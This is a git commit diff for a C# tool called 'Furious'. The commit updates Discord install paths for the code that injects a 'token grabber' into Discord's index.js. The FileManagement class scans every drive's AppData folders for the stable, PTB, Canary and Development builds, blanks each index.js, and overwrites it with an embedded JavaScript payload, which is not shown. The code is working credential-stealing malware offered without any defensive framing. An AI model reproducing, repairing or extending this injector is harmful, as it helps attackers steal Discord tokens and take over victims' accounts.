7a0cab01dbf063a898744e90fcb616d0aa6f23b6
EzSxurce <48179642+Jxiced@users.noreply.github.com>
2021-07-01 17:25:15 +0100

    Updated for Discord Update.
    Discord changed their file tree, this is now updated to work.

--- Furious/FileManagement.cs
+++ Furious/FileManagement.cs
@@ -1,4 +1,5 @@
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Reflection;
 using System.Threading.Tasks;
@@ -8,64 +9,48 @@ namespace Furious
 	/// <summary>
 	/// Internal class for managing the different files and folders required to inject the JS into the index.js file.
 	/// </summary>
-	internal class FileManagement
+	internal static class FileManagement
 	{
 		///Clears the targeted file of its contents.
-		internal static async Task CleanFile(string path)
+		internal static async Task CleanFile(string filePath)
 		{
 			try
 			{
-				using (StreamWriter streamWriter = new StreamWriter(path))
+				using (StreamWriter streamWriter = File.CreateText(filePath))
 				{
 					await streamWriter.WriteAsync(string.Empty);
 				}
+				Console.WriteLine(filePath + " cleaned!", Console.ForegroundColor = ConsoleColor.Green);
 			}
 			catch
 			{
-				Console.WriteLine("An error occured clearing index.js.");
+				Console.WriteLine("An error occured clearing index.js.", Console.ForegroundColor = ConsoleColor.Red);
 			}
 		}
 
 		///Writes the token grabbing JavaScript code into available Discord directories.
-		internal static async Task WriteDiscord(string path, string javascriptPath)
+		internal static async Task WriteDiscord(string filePath, string javascriptPath, string value = null)
 		{
-			if (File.Exists(path))
+			if (File.Exists(filePath))
 			{
 				try
 				{
-					await CleanFile(path);
+					await CleanFile(filePath);
 
-					string value = string.Empty;
 					using (StreamReader reader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(javascriptPath)))
 					{
 						value = await reader.ReadToEndAsync();
+						Console.WriteLine("js read successfully...", Console.ForegroundColor = ConsoleColor.Green);
 					}
-					using (StreamWriter writer = new StreamWriter(path))
-					{
+					using (StreamWriter writer = File.CreateText(filePath))
+                    			{
 						await writer.WriteAsync(value);
+						Console.WriteLine(filePath + " written!", Console.ForegroundColor = ConsoleColor.Green);
 					}
 				}
-				catch
-                		{
-					Console.WriteLine("Error writing to " + path);
-                		}
-			}
-		}
-
-		/// Searches within the available Discord directories for the version folder, 
-		/// then navigates to the index.js file to replace the code with the token grabber.
-		internal static async Task WriteJS(string path, string javascriptPath)
-		{
-			if (Directory.Exists(path))
-			{
-				string[] discord = Directory.GetDirectories(path);
-				foreach (string folderName in discord)
+				catch (Exception ex)
 				{
-					if (folderName.Contains("0."))
-					{
-						string DiscordPath = folderName + @"\modules\discord_modules\index.js";
-						await WriteDiscord(DiscordPath, javascriptPath);
-					}
+					Console.WriteLine(ex.ToString(), Console.ForegroundColor = ConsoleColor.Red);
 				}
 			}
 		}
@@ -73,13 +58,40 @@ namespace Furious
 		///This method is used to write the token grabbing JavaScript code into the Discord directory.
 		internal static async Task InjectJS()
 		{
-			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord", "Resources.stable.txt");
+			foreach (var drive in Environment.GetLogicalDrives())
+            		{
+				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\Discord", "Furious.Resources.index.txt");
 
-			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb", "Resources.ptb.txt");
+				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordPTB", "Furious.Resources.ptb.txt");
 
-			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary", "Resources.canary.txt");
+				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordCanary", "Furious.Resources.canary.txt");
 
-			await WriteJS(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment", "Resources.development.txt");
+				await ProcessDirectory($@"{drive}Users\{Environment.UserName}\AppData\Local\DiscordDevelopment", "Furious.Resources.development.txt");
+			}
+		}
+
+		/// Searches within the available Discord directories for the version folder, 
+		/// then navigates to the index.js file to replace the code with the token grabber.
+		internal static async Task ProcessDirectory(string dirPath, string javascriptPath)
+		{
+			if (Directory.Exists(dirPath))
+			{
+				Console.WriteLine(dirPath + " exists!", Console.ForegroundColor = ConsoleColor.Green);
+
+				string[] discord = Directory.GetDirectories(dirPath);
+				foreach (string folderName in discord)
+				{
+					if (folderName.Contains("0."))
+					{
+						string DiscordPath = folderName + @"\modules\discord_modules-1\discord_modules\index.js";
+						await WriteDiscord(DiscordPath, javascriptPath);
+					}
+				}
+			}
+			else
+            		{
+				Console.WriteLine(dirPath + " does NOT exist!", Console.ForegroundColor = ConsoleColor.DarkYellow);
+			}
 		}
 	}
 }
